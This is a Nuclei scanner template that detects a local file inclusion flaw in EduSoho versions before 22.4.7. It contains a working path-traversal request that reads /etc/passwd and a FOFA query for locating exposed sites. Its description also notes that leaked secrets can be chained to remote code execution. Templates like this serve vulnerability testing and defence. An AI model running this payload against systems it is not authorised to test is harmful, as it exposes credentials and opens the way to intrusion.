id: CNVD-2023-03903

info:
  name: EduSoho < v22.4.7 - Local File Inclusion
  author: securityforeveryone
  severity: high
  description: |
    The edusoho education and training system <v22.4.7 has unauthorized file reading vulnerability. Through this vulnerability, an attacker can read the contents of the config/parameters.yml file and obtain sensitive information such as the secret value saved in the file and database account password. After the secret value is obtained, an attacker can implement RCE with symfony _fragment routing.
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/135007351
    - https://github.com/gobysec/GobyVuls/blob/master/CNVD-2023-03903.md
  metadata:
    verified: true
    max-request: 1
    vendor: hagzhou-kuozhi-network-technology
    product: edusoho
    fofa-query: title="Powered By EduSoho" || body="Powered by <a href=\"http://www.edusoho.com/\" target=\"_blank\">EduSoho" || (body="Powered By EduSoho" && body="var app")
  tags: cnvd,cnvd2023,lfi,edushoho

http:
  - raw:
      - |
        GET /export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: content_type
        words:
          - "text/csv"

      - type: status
        status:
          - 200
# digest: 490a00463044022058dc904ed5105038ebd564d61eb6a74d14b5993ab926649994edc999a89650e50220499d1ca2862bfea9286d0685a4bdf6731e3e52db87c901176d3009e575472298:922c64590222798bb761d5b6d8e72950